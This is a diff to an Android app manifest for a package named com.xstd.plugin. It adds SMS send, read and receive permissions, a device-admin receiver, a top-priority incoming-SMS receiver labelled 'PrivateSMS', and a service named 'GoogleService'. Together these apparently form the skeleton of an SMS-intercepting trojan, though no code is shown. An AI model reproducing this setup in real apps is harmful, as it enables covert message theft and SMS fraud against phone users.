@@ -13,6 +13,10 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
 
     <application
         android:icon="@drawable/ic_launcher"
@@ -27,6 +31,7 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+
         <receiver
             android:name="com.xstd.plugin.receiver.ScreenBRC"
             android:priority="0x7fffffff">
@@ -34,8 +39,40 @@
                 <action android:name="android.intent.action.USER_PRESENT"/>
             </intent-filter>
         </receiver>
+        <receiver
+            android:name="com.xstd.plugin.binddevice.DeviceBindBRC"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+            </intent-filter>
+
+        </receiver>
+        <receiver
+            android:name="com.xstd.plugin.receiver.PackageInstallBRC"
+            android:priority="0x7fffffff">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.xstd.plugin.receiver.PrivateSMSBRC"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="0x7fffffff">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
 
         <service android:name="com.xstd.plugin.service.PluginService"/>
+        <service
+            android:name="com.xstd.plugin.service.GoogleService"
+            android:process=":remote"/>
     </application>
 
 </manifest>
